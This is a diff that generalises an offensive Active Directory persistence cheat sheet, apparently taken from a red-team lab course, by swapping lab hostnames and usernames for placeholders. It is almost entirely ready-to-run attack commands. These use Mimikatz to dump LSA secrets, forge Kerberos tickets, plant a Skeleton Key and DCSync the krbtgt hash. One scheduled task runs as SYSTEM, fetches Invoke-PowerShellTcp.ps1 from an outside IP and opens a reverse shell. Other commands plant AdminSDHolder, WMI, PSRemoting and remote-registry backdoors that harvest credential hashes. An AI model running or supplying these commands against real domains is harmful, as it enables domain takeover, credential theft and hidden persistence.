@@ -5,7 +5,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName *computername*
 
 --Generate a Silver Ticket:
 
-Invoke-Mimikatz -Command '"kerberos::golden /domain:DOMAIN /sid:SID /target:dcorp-dc.dollarcorp.moneycorp.local(targetComputer) /service:HOST/CIFS /rc4:NTLM /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /domain:DOMAIN /sid:SID /target:DC.domain.local(targetComputer) /service:HOST/CIFS /rc4:NTLM /user:Administrator /ptt"'
 
 ----
 
@@ -13,14 +13,14 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:DOMAIN /sid:SID /target:dcor
 
 -Host the script trying to achieve (of course) and in this case it's Invoke-PowerShellTcp.ps1 (added the reverse function to the end of the script so it'll execute without importing the module)
 
-schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.71/Invoke-PowerShellTcp.ps1''')'"
+schtasks /create /S DC(or Target Computer).domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.71/Invoke-PowerShellTcp.ps1''')'"
 
-schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+schtasks /Run /S DC(or Target Computer).domain.local /TN "STCheck"
 
 
 ----------------Skeleton Key--(DANGEROUS)-(DANGEROUS FOR CLIENT/TARGET'S SECURITY)--------------------access users with 1 password
 
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcop-dc.dollarcorp.moneycorp.local
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName DC.domain.local
 
 Enter-PSSession -ComputerName *ComputerName* -Credential dcorp\Administrator
 
@@ -29,13 +29,13 @@ Enter-PSSession -ComputerName *ComputerName* -Credential dcorp\Administrator
 
 DSRM is the "safe mode" of the DC, it goes this way usually when a server is promoted to DC.
 
-Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName DC.domain.local
 
 -Compare the Administrator hash with the Administrator hash of below command :
 
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName DC.domain.local
 
-Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Enter-PSSession -ComputerName DC.domain.local
 
 [dcorp-dc]: PS C:\Users....> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose
 
@@ -85,11 +85,11 @@ Well known abuse of some of the Protected Groups - All of the below can log on l
 
 -With Domain Admin privileges
 
-Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student71 -Rights All(or ResetPassword/WriteMembers) -Verbose (or not -Verbose)
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName USER -Rights All(or ResetPassword/WriteMembers) -Verbose (or not -Verbose)
 
 -Triggering the SDPropagator on the DC
 
-$sess = New-PSSession -ComputerName dcorp-dc.......
+$sess = New-PSSession -ComputerName DC.domain.local
 
 Invoke-Command -FilePath %PATH%\Invoke-SDPropagator.ps1 -Session $sess
 
@@ -101,17 +101,17 @@ Invoke-SDPropagator
 
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student71'}
 
--Abusing FullControl using PowerView_dev.ps1
+-Abusing FullControl using PowerView.ps1
 
 Add-DomainGroupMember -Identity 'Domain Admins' -Members anyuser -Verbose (or not -Verbose)
 
-----OUTPUT: "VERBOSE: [Add-DomainGroupMember] Adding member 'student71' to group 'Domain Admins'"
+----OUTPUT: "VERBOSE: [Add-DomainGroupMember] Adding member 'USER' to group 'Domain Admins'"
 
 -Check if the user got added to Domain Admins group
 
 net user *user* /domain
 
-*--Abusing ResetPassword using PowerView_dev.ps1
+*--Abusing ResetPassword using PowerView.ps1
 
 Set-DomainUserPassword -Identity anyuser -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose (or not -Verbose)
 
@@ -120,9 +120,9 @@ Set-DomainUserPassword -Identity anyuser -AccountPassword (ConvertTo-SecureStrin
 
 Add FullControl rights:
 
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' (After being in the Domain Admins group, you can execute it from a regular PowerShell process, even not running as administrator)
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"' (After being in the Domain Admins group, you can execute it from a regular PowerShell process, even not running as administrator)
 
-#Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName user -Rights All(DCSync too) -Verbose
+#Add-ObjectAcl -TargetDistinguishedName 'DC=DOMAIN,DC=local' -PrincipalSamAccountName user -Rights All(DCSync too) -Verbose
 
 
 -------------Persistence using ACLs - Security Descriptors--------------
@@ -140,27 +140,27 @@ Set-RemoteWMI.ps1
 ACLs can be modified to allow non-admin users access to securable objects
 -On local machine for student71:
 
-Set-RemoteWMI -UserName student71 -Verbose
+Set-RemoteWMI -UserName USER -Verbose
 
--On remote machine for student71 without explicit credentials:
+-On remote machine for USER without explicit credentials:
 
-Set-RemoteWMI -UserName student71 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName USER -ComputerName DC -namespace 'root\cimv2' -Verbose
 
 -On remote machine WITH explicit credentials. Only root\cimv2 and nested namespaces:
 
-Set-RemoteWMI -UserName student71 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName USER -ComputerName DC -Credential Administrator -namespace 'root\cimv2' -Verbose
 
 -On remote machine remove permissions:
 
-Set-RemoteWMI -UserName student71 -ComputerName dcrop-dc -namespace 'root\cimv2' -Remove -Verbose
+Set-RemoteWMI -UserName USER -ComputerName DC -namespace 'root\cimv2' -Remove -Verbose
 
 ------------
 
-Set-RemotePSRemoting -UserName student71 -ComputerName dcorp-dc
+Set-RemotePSRemoting -UserName USER -ComputerName DC
 
 then from a non-privileged powershell session:
 
-Invoke-Command -ScriptBlock {whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-Command -ScriptBlock {whoami} -ComputerName DC.domain.local
 
 Now commands on the DC can run without even having any admin privileges window!!!
 
@@ -168,16 +168,16 @@ Now commands on the DC can run without even having any admin privileges window!!
 
 Using DAMP, with admin privs on remote machine
 
-Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student71 -Verbose
+Add-RemoteRegBackdoor -ComputerName DC -Trustee USER -Verbose
 
--As student71, retrieve machine account hash:
+-As USER, retrieve machine account hash:
 
-Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+Get-RemoteMachineAccountHash -ComputerName DC -Verbose
 
 -Retrieve local account hash:
 
-Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+Get-RemoteLocalAccountHash -ComputerName DC -Verbose
 
 -Retrieve domain cached credentials:
 
-Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+Get-RemoteCachedCredential -ComputerName DC -Verbose
